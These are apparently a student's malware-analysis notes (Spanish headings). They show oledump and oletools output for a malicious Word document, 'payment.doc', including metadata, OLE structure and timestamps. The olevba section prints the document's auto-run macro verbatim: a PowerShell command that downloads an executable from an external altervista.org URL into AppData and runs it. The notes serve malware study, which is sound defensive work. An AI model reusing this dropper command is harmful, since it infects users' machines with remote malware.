# An√°lisis de malware

https://github.com/DidierStevens/DidierStevensSuite

## Macros
```bash
# Ver que archivos tiene macros
$ python3 oledump.py ../../office\ files/payment.doc
  1:       114 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:      6830 '1Table'
  5:       379 'Macros/PROJECT'
  6:        41 'Macros/PROJECTwm'
  7: M    1471 'Macros/VBA/ThisDocument' # La "M" Significa que tiene macros
  8:      2322 'Macros/VBA/_VBA_PROJECT'
  9:       514 'Macros/VBA/dir'
 10:      4096 'WordDocument'
# Selecionar el id para ver el macro con -s
$ python3 oledump.py ../../office\ files/payment.doc -s 7
```

## oletools

https://github.com/decalage2/oletools

### olevba.py

```bash
remnux@remnux:~/Downloads/oletools/oletools$ python3 olevba.py ../../../office\ files/payment.doc 
XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
/home/remnux/Downloads/oletools/oletools/oleobj.py:581: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if idx is -1:
olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ../../../office files/payment.doc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ../../../office files/payment.doc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Shell ("cmd.exe /c PoWerSHElL (nEW-oBjEcT sYsTeM.neT.wEBcLiEnT).dOWNLOadfIlE('http://hhrz83.altervista.org/NDGAFV.exe','%Appdata%\playa.exe');&start %Appdata%\playa.exe& exit")
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|PoWerSHElL          |May run PowerShell commands                  |
|Suspicious|nEW-oBjEcT          |May create an OLE object using PowerShell    |
|Suspicious|neT.wEBcLiEnT       |May download files from the Internet using   |
|          |                    |PowerShell                                   |
|Suspicious|dOWNLOadfIlE        |May download files from the Internet using   |
|          |                    |PowerShell                                   |
|Suspicious|sYsTeM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |http://hhrz83.alterv|URL                                          |
|          |ista.org/NDGAFV.exe'|                                             |
|          |,'%Appdata%\playa.ex|                                             |
|          |e'                  |                                             |
|IOC       |cmd.exe             |Executable file name                         |
|IOC       |NDGAFV.exe          |Executable file name                         |
|IOC       |playa.exe           |Executable file name                         |
+----------+--------------------+---------------------------------------------+
```

### oleid.py

```bash
remnux@remnux:~/Downloads/oletools/oletools$ python3 oleid.py ../../../office\ files/payment.doc 
XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
oleid 0.60.1 - http://decalage.info/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

Filename: ../../../office files/payment.doc
WARNING  For now, VBA stomping cannot be detected for files in memory
--------------------+--------------------+----------+--------------------------
Indicator           |Value               |Risk      |Description               
--------------------+--------------------+----------+--------------------------
File format         |MS Word 97-2003     |info      |                          
                    |Document or Template|          |                          
--------------------+--------------------+----------+--------------------------
Container format    |OLE                 |info      |Container type            
--------------------+--------------------+----------+--------------------------
Application name    |Microsoft Office    |info      |Application name declared 
                    |Word                |          |in properties             
--------------------+--------------------+----------+--------------------------
Properties code page|1252: ANSI Latin 1; |info      |Code page used for        
                    |Western European    |          |properties                
                    |(Windows)           |          |                          
--------------------+--------------------+----------+--------------------------
Author              |admin               |info      |Author declared in        
                    |                    |          |properties                
--------------------+--------------------+----------+--------------------------
Encrypted           |False               |none      |The file is not encrypted 
--------------------+--------------------+----------+--------------------------
VBA Macros          |Yes, suspicious     |HIGH      |This file contains VBA    
                    |                    |          |macros. Suspicious        
                    |                    |          |keywords were found. Use  
                    |                    |          |olevba and mraptor for    
                    |                    |          |more info.                
--------------------+--------------------+----------+--------------------------
XLM Macros          |No                  |none      |This file does not contain
                    |                    |          |Excel 4/XLM macros.       
--------------------+--------------------+----------+--------------------------
External            |0                   |none      |External relationships    
Relationships       |                    |          |such as remote templates, 
                    |                    |          |remote OLE objects, etc   
--------------------+--------------------+----------+--------------------------
```

### olemeta.py

```bash
remnux@remnux:~/Downloads/oletools/oletools$ python3 olemeta.py ../../../office\ files/payment.doc 
olemeta 0.54 - http://decalage.info/python/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues
===============================================================================
FILE: ../../../office files/payment.doc

Properties from the SummaryInformation stream:
+---------------------+------------------------------+
|Property             |Value                         |
+---------------------+------------------------------+
|codepage             |1252                          |
|title                |                              |
|subject              |                              |
|author               |admin                         |
|keywords             |                              |
|comments             |                              |
|template             |Normal.dotm                   |
|last_saved_by        |admin                         |
|revision_number      |1                             |
|total_edit_time      |180                           |
|create_time          |2016-06-29 17:09:00           |
|last_saved_time      |2016-06-29 17:12:00           |
|num_pages            |1                             |
|num_words            |0                             |
|num_chars            |0                             |
|creating_application |Microsoft Office Word         |
|security             |0                             |
+---------------------+------------------------------+

Properties from the DocumentSummaryInformation stream:
+---------------------+------------------------------+
|Property             |Value                         |
+---------------------+------------------------------+
|codepage_doc         |1252                          |
|lines                |0                             |
|paragraphs           |0                             |
|scale_crop           |False                         |
|company              |                              |
|links_dirty          |False                         |
|chars_with_spaces    |0                             |
|shared_doc           |False                         |
|hlinks_changed       |False                         |
|version              |983040                        |
+---------------------+------------------------------+
```


### oledir.py

```
remnux@remnux:~/Downloads/oletools/oletools$ python3 oledir.py ../../../office\ files/payment.doc 
oledir 0.54 - http://decalage.info/python/oletools
OLE directory entries in file ../../../office files/payment.doc:
----+------+-------+----------------------+-----+-----+-----+--------+------
id  |Status|Type   |Name                  |Left |Right|Child|1st Sect|Size  
----+------+-------+----------------------+-----+-----+-----+--------+------
0   |<Used>|Root   |Root Entry            |-    |-    |3    |2A      |4992  
1   |<Used>|Stream |1Table                |-    |-    |-    |8       |6830  
2   |<Used>|Stream |WordDocument          |5    |-    |-    |0       |4096  
3   |<Used>|Stream |\x05SummaryInformation|2    |4    |-    |16      |4096  
4   |<Used>|Stream |\x05DocumentSummaryInf|-    |-    |-    |1E      |4096  
    |      |       |ormation              |     |     |     |        |      
5   |<Used>|Storage|Macros                |1    |12   |11   |0       |0     
6   |<Used>|Storage|VBA                   |-    |-    |7    |0       |0     
7   |<Used>|Stream |ThisDocument          |9    |8    |-    |0       |1471  
8   |<Used>|Stream |_VBA_PROJECT          |-    |-    |-    |17      |2322  
9   |<Used>|Stream |dir                   |-    |-    |-    |3C      |514   
10  |<Used>|Stream |PROJECTwm             |-    |-    |-    |45      |41    
11  |<Used>|Stream |PROJECT               |6    |10   |-    |46      |379   
12  |<Used>|Stream |\x01CompObj           |-    |-    |-    |4C      |114   
13  |unused|Empty  |                      |-    |-    |-    |0       |0     
14  |unused|Empty  |                      |-    |-    |-    |0       |0     
15  |unused|Empty  |                      |-    |-    |-    |0       |0     
----+----------------------------+------+--------------------------------------
id  |Name                        |Size  |CLSID                                 
----+----------------------------+------+--------------------------------------
0   |Root Entry                  |-     |00020906-0000-0000-C000-000000000046  
    |                            |      |Microsoft Word 97-2003 Document       
    |                            |      |(Word.Document.8)                     
12  |\x01CompObj                 |114   |                                      
4   |\x05DocumentSummaryInformati|4096  |                                      
    |on                          |      |                                      
3   |\x05SummaryInformation      |4096  |                                      
1   |1Table                      |6830  |                                      
5   |Macros                      |-     |                                      
11  |  PROJECT                   |379   |                                      
10  |  PROJECTwm                 |41    |                                      
6   |  VBA                       |-     |                                      
7   |    ThisDocument            |1471  |                                      
8   |    _VBA_PROJECT            |2322  |                                      
9   |    dir                     |514   |                                      
2   |WordDocument                |4096  |
```

### olemap.py
```bash
remnux@remnux:~/Downloads/oletools/oletools$ python3 olemap.py ../../../office\ files/payment.doc 
olemap 0.55 - http://decalage.info/python/oletools
-------------------------------------------------------------------------------
FILE: ../../../office files/payment.doc

OLE HEADER:
+------------------------+----------------+-----------------------------------+
|Attribute               |Value           |Description                        |
+------------------------+----------------+-----------------------------------+
|OLE Signature (hex)     |D0CF11E0A1B11AE1|Should be D0CF11E0A1B11AE1         |
|Header CLSID            |                |Should be empty (0)                |
|Minor Version           |003E            |Should be 003E                     |
|Major Version           |0003            |Should be 3 or 4                   |
|Byte Order              |FFFE            |Should be FFFE (little endian)     |
|Sector Shift            |0009            |Should be 0009 or 000C             |
|# of Dir Sectors        |0               |Should be 0 if major version is 3  |
|# of FAT Sectors        |1               |                                   |
|First Dir Sector        |00000027        |(hex)                              |
|Transaction Sig Number  |0               |Should be 0                        |
|MiniStream cutoff       |4096            |Should be 4096 bytes               |
|First MiniFAT Sector    |00000029        |(hex)                              |
|# of MiniFAT Sectors    |1               |                                   |
|First DIFAT Sector      |FFFFFFFE        |(hex)                              |
|# of DIFAT Sectors      |0               |                                   |
+------------------------+----------------+-----------------------------------+

CALCULATED ATTRIBUTES:
+------------------------+----------------+-----------------------------------+
|Attribute               |Value           |Description                        |
+------------------------+----------------+-----------------------------------+
|Sector Size (bytes)     |512             |Should be 512 or 4096 bytes        |
|Actual File Size (bytes)|28160           |Real file size on disk             |
|Max File Size in FAT    |66048.0         |Max file size covered by FAT       |
|Extra data beyond FAT   |0               |Only if file is larger than FAT    |
|                        |                |coverage                           |
|Extra data offset in FAT|00006E00        |Offset of the 1st free sector at   |
|                        |                |end of FAT                         |
|Extra data size         |0               |Size of data starting at the 1st   |
|                        |                |free sector at end of FAT          |
+------------------------+----------------+-----------------------------------+
```


### oletimes.py

```bash
remnux@remnux:~/Downloads/oletools/oletools$ python3 oletimes.py ../../../office\ files/payment.doc 
oletimes 0.54 - http://decalage.info/python/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues
===============================================================================
FILE: ../../../office files/payment.doc

+----------------------------+---------------------+---------------------+
| Stream/Storage name        | Modification Time   | Creation Time       |
+----------------------------+---------------------+---------------------+
| Root                       | 2016-06-29 17:12:28 | None                |
| '\x01CompObj'              | None                | None                |
| '\x05DocumentSummaryInform | None                | None                |
| ation'                     |                     |                     |
| '\x05SummaryInformation'   | None                | None                |
| '1Table'                   | None                | None                |
| 'Macros'                   | 2016-06-29 17:12:28 | 2016-06-29 17:12:28 |
| 'Macros/PROJECT'           | None                | None                |
| 'Macros/PROJECTwm'         | None                | None                |
| 'Macros/VBA'               | 2016-06-29 17:12:28 | 2016-06-29 17:12:28 |
| 'Macros/VBA/ThisDocument'  | None                | None                |
| 'Macros/VBA/_VBA_PROJECT'  | None                | None                |
| 'Macros/VBA/dir'           | None                | None                |
| 'WordDocument'             | None                | None                |
+----------------------------+---------------------+---------------------+
```
